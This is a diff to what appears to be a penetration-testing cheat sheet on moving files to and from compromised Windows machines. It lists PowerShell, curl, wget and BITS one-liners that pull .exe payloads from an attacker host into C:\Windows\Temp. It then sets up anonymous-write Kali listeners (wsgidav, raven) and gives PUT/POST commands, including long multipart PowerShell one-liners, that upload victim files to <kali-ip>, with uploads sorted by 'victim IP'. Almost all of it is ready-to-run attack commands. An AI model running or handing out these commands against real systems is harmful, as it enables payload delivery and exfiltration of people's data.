@@ -1,4 +1,7 @@
 ## File Transfer
+
+#GET#
+
 1.PowerShell WebClient (very common)
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe', 'C:\Windows\Temp\file.exe')"
 2.Invoke-WebRequest (IWR) (extremely common)
@@ -14,3 +17,69 @@ Start-BitsTransfer -Source http://10.10.10.10/file.exe -Destination C:\Windows\T
 curl http://10.10.10.10/file.exe -o C:\Windows\Temp\file.exe
 8. wget (If installed)
 wget -O C:\path\to\file.exe http://example.com/file.exe
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+## PUT/POST  + WsgiDav install on Kali to receive files ##
+
+# Install and start wsgidav listening on port 80 on kali #
+  sudo apt update
+  sudo apt install python3-wsgidav
+  mkdir -p /home/kali/webdav
+  sudo chmod 777 /home/kali/webdav   # anonymous write access (easy for lab use)
+  sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav    # Start listener as sudo (required for port 80)
+
+# Send file from windows, PUT best (See notes after list of commands)
+#### 1. wget PUT
+wget --method=PUT --body-file=C:\path\to\file.exe http://<kali-ip>/file.exe -O nul
+
+#### 2. curl
+
+**Curl PUT (cleanest & 100% reliable with wsgidav) **
+curl -T C:\path\to\file.exe http://<kali-ip>/file.exe
+**Curl POST**
+curl -X POST -T C:\path\to\file.exe http://<kali-ip>/file.exe
+
+#### 3. PowerShell WebClient
+
+**Powershell PUT (shortest & works perfectly) **
+powershell -c "(New-Object System.Net.WebClient).UploadFile('http://<kali-ip>/file.exe', 'C:\path\to\file.exe')"
+**Powershell POST (multipart version – works but longer)**
+powershell -c "$u='http://<kali-ip>/file.exe';$f='C:\path\to\file.exe';$n=Split-Path $f -Leaf;$b='----WebKitFormBoundary'+[Guid]::NewGuid();$r=[Net.WebRequest]::Create($u);$r.Method='POST';$r.ContentType='multipart/form-data; boundary='+$b;$s=$r.GetRequestStream();$e=[Text.Encoding]::ASCII;$s.Write($e.GetBytes('--'+$b+'`r`nContent-Disposition: form-data; name=\"file\"; filename=\"'+$n+'\"`r`nContent-Type: application/octet-stream`r`n`r`n'),0,('--'+$b+'`r`nContent-Disposition: form-data; name=\"file\"; filename=\"'+$n+'\"`r`nContent-Type: application/octet-stream`r`n`r`n').Length);$s.Write([IO.File]::ReadAllBytes($f),0,([IO.File]::ReadAllBytes($f)).Length);$s.Write($e.GetBytes('`r`n--'+$b+'--`r`n'),0,('`r`n--'+$b+'--`r`n').Length);$s.Close();$r.GetResponse().Close()"
+
+#### 4. Invoke-WebRequest (IWR)
+
+**Powershell PUT (simple & reliable)** 
+powershell -c "Invoke-WebRequest -Uri 'http://<kali-ip>/file.exe' -Method Put -InFile 'C:\path\to\file.exe'"
+**Powershell POST (multipart – works in PS 5+ and PS 7+)**
+powershell -c "Invoke-WebRequest -Uri 'http://<kali-ip>/file.exe' -Method Post -Form @{file = Get-Item 'C:\path\to\file.exe'}"
+
+**Notes**
+- PUT versions are the cleanest and most reliable with wsgidav (file lands exactly as-is).
+- POST versions also work (wsgidav accepts them), but they send a tiny bit of extra wrapper in some cases.
+- The filename you put after the final `/` becomes the name on Kali (e.g. `/file.exe` → `/home/kali/webdav/file.exe`).
+- Want files organised by victim IP? Just PUT to /victim-ip/file.exe → it auto-creates the folder.
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+# POST Only + Raven Receive # 
+
+# Start listener on kali and organise into directories based on ip
+# sudo raven 0.0.0.0 80 --upload-dir . --organize-uploads    
+
+**curl** (best & shortest)
+curl -X POST -F "file=@C:\path\to\file.exe" http://<kali-ip>:80/
+**wget** (works but only reliable for text files; binary files may corrupt because wget doesn’t build proper multipart in a simple one-liner)
+wget --method=POST --body-file=C:\path\to\file.exe http://<kali-ip>:80/ -O nul
+**PowerShell** (binary-safe, works on every Windows version, no functions)
+powershell -c "$u='http://<kali-ip>:80/';$f='C:\path\to\file.exe';$n=Split-Path $f -Leaf;$b='----WebKitFormBoundary'+[Guid]::NewGuid();$r=[Net.WebRequest]::Create($u);$r.Method='POST';$r.ContentType='multipart/form-data; boundary='+$b;$s=$r.GetRequestStream();$e=[Text.Encoding]::ASCII;$s.Write($e.GetBytes('--'+$b+'`r`nContent-Disposition: form-data; name=\"file\"; filename=\"'+$n+'\"`r`nContent-Type: application/octet-stream`r`n`r`n'),0,('--'+$b+'`r`nContent-Disposition: form-data; name=\"file\"; filename=\"'+$n+'\"`r`nContent-Type: application/octet-stream`r`n`r`n').Length);$s.Write([IO.File]::ReadAllBytes($f),0,([IO.File]::ReadAllBytes($f)).Length);$s.Write($e.GetBytes('`r`n--'+$b+'--`r`n'),0,('`r`n--'+$b+'--`r`n').Length);$s.Close();$r.GetResponse().Close()"
+**IWR** (Invoke-WebRequest — cleanest if you have PowerShell 7+; otherwise fall back to the PowerShell line above)
+powershell -c "Invoke-WebRequest -Uri 'http://<kali-ip>:80/' -Method Post -Form @{file = Get-Item 'C:\path\to\file.exe'}"
